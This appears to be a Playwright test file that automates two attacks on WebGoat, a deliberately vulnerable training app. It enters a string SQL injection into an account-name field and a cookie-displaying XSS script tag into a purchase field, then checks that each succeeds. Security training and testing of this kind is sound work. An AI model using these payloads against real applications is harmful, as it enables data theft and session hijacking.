import { test, expect } from '@playwright/test';

test.use({ storageState: './tmp/admin.json' })
test.describe('attacks', () => {
    test('string sql injection', async ({ page }) => {
      await page.goto('/WebGoat/start.mvc#attack/538385464/1100');
      await page.locator('input[name="account_name"]').fill('Smith\' or \'98\'=\'98');

      await page.locator('input:has-text("Go!")').click();
      await expect(page.locator("text=987654321")).toHaveCount(1)

    })

    test('xss', async ({ page }) => {
      await page.goto('/WebGoat/start.mvc#attack/1406352188/900');
      await page.locator('input[name="field1"]').fill('<script>document.body.innerHTML="owned:"+document.cookie</script>');

      await page.locator('input:has-text("Purchase")').click();
      await expect(page.locator("text=owned")).toHaveCount(1)

    })
  });

  